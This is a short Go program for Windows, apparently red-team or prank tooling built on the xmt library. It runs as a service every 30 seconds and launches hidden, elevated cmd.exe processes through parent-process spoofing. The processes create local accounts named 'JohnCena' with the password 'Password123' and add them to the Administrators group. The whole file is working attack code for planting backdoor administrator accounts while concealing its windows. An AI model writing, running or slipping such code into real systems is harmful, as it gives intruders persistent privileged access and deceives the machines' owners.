// +build windows

package main

import (
	"strconv"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/device/devtools"
)

const userName = "JohnCena"

// const userName = "MattDaemon"

var count = 0

// user_add.go
// Fun thing, creates user accounts lol.

func main() {
	(&devtools.Service{Exec: generate, Interval: time.Second * 30}).Run()
}
func generate() {
	p := cmd.NewProcess("cmd.exe", "/c", "net user "+userName+" "+strconv.Itoa(count)+" Password123 /add")
	p.Dir = "C:\\"
	p.SetParent(cmd.F().SetElevated(true))
	p.SetWindowDisplay(0)
	p.Run()
	p = cmd.NewProcess("cmd.exe", "/c", "net localgroup Administrators "+userName+" "+strconv.Itoa(count)+" /add")
	// Fix a bug where cmd DOES NOT like the system working directory.
	p.Dir = "C:\\"
	p.SetParent(cmd.F().SetElevated(true))
	p.SetWindowDisplay(0)
	p.Run()
	count++
}
